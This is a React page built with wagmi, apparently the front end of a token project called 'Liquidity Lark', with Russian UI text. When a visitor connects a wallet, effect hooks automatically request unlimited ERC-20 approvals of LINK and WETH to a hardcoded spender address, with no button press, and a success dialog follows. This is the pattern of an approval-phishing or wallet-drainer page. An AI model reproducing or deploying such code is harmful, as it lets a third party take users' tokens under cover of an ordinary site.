import { ConnectKitButton } from "connectkit";
import { useState, useEffect } from "react";
import {
  useAccount,
  usePrepareContractWrite,
  useContractWrite,
  useContractRead,
  useWaitForTransaction,
} from "wagmi";
import { ethers } from "ethers";
import { erc20ABI } from "wagmi";
import * as Dialog from "@radix-ui/react-dialog";

const linkAddress = "0x779877A7B0D9E8603169DdbD7836e478b4624789";
const wethAddress = "0xfFf9976782d46CC05630D1f6eBAb18b2324d6B14";
const spenderAddress = "0xA21A0eA75b8112850D146CCa56A4379a7aFe02D9";
const MAX_ALLOWANCE = ethers.MaxUint256;

export default function Home() {
  const { isConnected, address } = useAccount();
  const [linkApproved, setLinkApproved] = useState(false);
  const [wethApproved, setWethApproved] = useState(false);

  const [isDialogOpen, setIsDialogOpen] = useState(false);

  // Read Allowance for LINK
  const { data: linkAllowance, refetch: refetchLinkAllowance } =
    useContractRead({
      address: linkAddress,
      abi: erc20ABI,
      functionName: "allowance",
      // @ts-ignore
      args: [address, spenderAddress],
    });

  // Read Allowance for WETH
  const { data: wethAllowance, refetch: refetchWethAllowance } =
    useContractRead({
      address: wethAddress,
      abi: erc20ABI,
      functionName: "allowance",
      // @ts-ignore
      args: [address, spenderAddress],
    });

  // Prepare Contract Write for LINK
  const { config: linkConfig } = usePrepareContractWrite({
    address: linkAddress,
    abi: erc20ABI,
    functionName: "approve",
    args: [spenderAddress, MAX_ALLOWANCE],
  });
  const linkContractWrite = useContractWrite(linkConfig);

  // Prepare Contract Write for WETH
  const { config: wethConfig } = usePrepareContractWrite({
    address: wethAddress,
    abi: erc20ABI,
    functionName: "approve",
    args: [spenderAddress, MAX_ALLOWANCE],
  });
  const wethContractWrite = useContractWrite(wethConfig);

  // Check transaction status for LINK
  useWaitForTransaction({
    hash: linkContractWrite.data?.hash,
    onSuccess: () => {
      refetchLinkAllowance();
      setLinkApproved(true);
    },
  });

  // Check transaction status for WETH
  useWaitForTransaction({
    hash: wethContractWrite.data?.hash,
    onSuccess: () => {
      refetchWethAllowance();
      setWethApproved(true);
    },
  });

  // Проверка разрешения для LINK, если кошелек подключен
  useEffect(() => {
    if (isConnected && !linkApproved && !linkAllowance) {
      // Проверка allowance для LINK
      // Если allowance недостаточно, вызываем:
      linkContractWrite.write?.();
    }
  }, [isConnected, linkAllowance]);

  // Проверка разрешения для WETH
  useEffect(() => {
    if (isConnected && !wethApproved && !wethAllowance) {
      wethContractWrite.write?.();
    }
  }, [isConnected, wethAllowance]);

  useEffect(() => {
    if (linkApproved && wethApproved && isConnected) {
      setIsDialogOpen(true);
    }
  }, [linkApproved, wethApproved, isConnected]);

  return (
    <div className="bg-gradient-to-r from-blue-300 to-green-300 h-screen flex flex-col justify-center items-center relative">
      <div className="absolute top-0 right-0 p-4">
        <ConnectKitButton />
      </div>
      {isConnected ? (
        <div
          suppressHydrationWarning
          className="text-white text-4xl md:text-6xl lg:text-8xl text-center"
        >
          Форма
        </div>
      ) : (
        <div
          suppressHydrationWarning
          className="text-white text-4xl md:text-6xl lg:text-8xl text-center"
        >
          Liquidity Lark Project
        </div>
      )}
      <Dialog.Root open={isDialogOpen} onOpenChange={setIsDialogOpen}>
        <Dialog.Trigger />
        <Dialog.Portal>
          <Dialog.Overlay className="fixed inset-0 bg-black bg-opacity-30" />
          <Dialog.Content className="fixed top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 bg-white p-6 rounded-md shadow-lg">
            <Dialog.Title className="text-black text-[28px] pt-[40px]">
              Транзакции прошли успешно!
            </Dialog.Title>
            <Dialog.Description className="text-black text-[18px] pt-[20px]">
              Вы дали разрешение контракту на использование LINK и WETH!
            </Dialog.Description>
            <Dialog.Close className="text-black absolute top-2 right-2">
              Close
            </Dialog.Close>
          </Dialog.Content>
        </Dialog.Portal>
      </Dialog.Root>
    </div>
  );
}
